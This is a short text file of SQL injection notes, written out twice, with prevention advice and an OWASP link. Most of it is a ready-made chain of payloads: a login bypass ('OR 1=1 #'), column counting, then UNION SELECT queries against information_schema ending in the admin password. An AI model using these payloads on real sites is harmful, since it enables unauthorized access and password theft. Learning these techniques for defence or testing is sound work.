SQL injection is used to directly inject code into the database using forms

Attackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user supplied input. 
To avoid SQL injection flaws, developers need to:

See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html  
  -Stop writing dynamic queries with string concatenation or
  -Prevent malicious SQL input from being included in executed queries.

See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html  

-> Some examples of injection.

No need of password
  Add (between []) [' OR 1=1 #] to obtain instant access to Admin page.

Obtain the number of columns
  Add [' OR 1=1 order by x #] (with x=1,2,3, ... until the impossibility to 
  connect. That gives the number of columns.

Obtain the database version
  Add [' OR 1=1 union select 0,@@version,2 order by id; #]

Obtain name of tables
  Add [' OR 1=1 union select 0, group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() order by 1; #]

Obtain name of columns
  Add [' OR 1=1 union select 0, group_concat(column_name),2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="admin" order by 1; #]

Obtain the admini's password
  Add [' OR 1=1 union select 0,motdepasse,2 FROM `admin` order by id; #]

-> How to prevent injection

Use real_escape_string()

Stop writing dynamic queries with string concatenation or

Prevent malicious SQL input from being included in executed queries.


>@################################################################################################################################################
>@#                                                                                                                                              #
>@# SQL injection is used to directly inject code into the database using forms.                                                                 #
>@#                                                                                                                                              #
>@# Attackers can use SQL injection on an application if it has dynamic database queries that use string concatenation and user supplied input.  #
>@# To avoid SQL injection flaws, developers need to:                                                                                            #
>@#                                                                                                                                              #
>@#   -Stop writing dynamic queries with string concatenation.                                                                                   #
>@#   -Prevent malicious SQL input from being included in executed queries.                                                                      #
>@#                                                                                                                                              #
>@# See: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html                                                #
>@# See: howto-0100-prevention-web-vulnerability.txt                                                                                             #
>@#                                                                                                                                              #
>@#----------------------------------------------------------------------------------------------------------------------------------------------- 
>@
>@
>@-> Some examples of injection.
>@
>@No need of password
>@  Add (between []) [' OR 1=1 #] to obtain instant access to Admin page.
>@
>@Obtain the number of columns
>@  Add [' OR 1=1 order by x #] (with x=1,2,3, ... until the impossibility to 
>@  connect. That gives the number of columns.
>@
>@Obtain the database version
>@  Add [' OR 1=1 union select 0,@@version,2 order by id; #]
>@
>@Obtain name of tables
>@  Add [' OR 1=1 union select 0, group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() order by 1; #]
>@
>@Obtain name of columns
>@  Add [' OR 1=1 union select 0, group_concat(column_name),2 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="admin" order by 1; #]
>@
>@Obtain the admini's password
>@  Add [' OR 1=1 union select 0,motdepasse,2 FROM `admin` order by id; #]
>@
>@-> How to prevent injection
>@
>@  -Use real_escape_string()
>@  -Stop writing dynamic queries with string concatenation or
>@  -Prevent malicious SQL input from being included in executed queries.
>@
>@################################################################################################################################################
>@
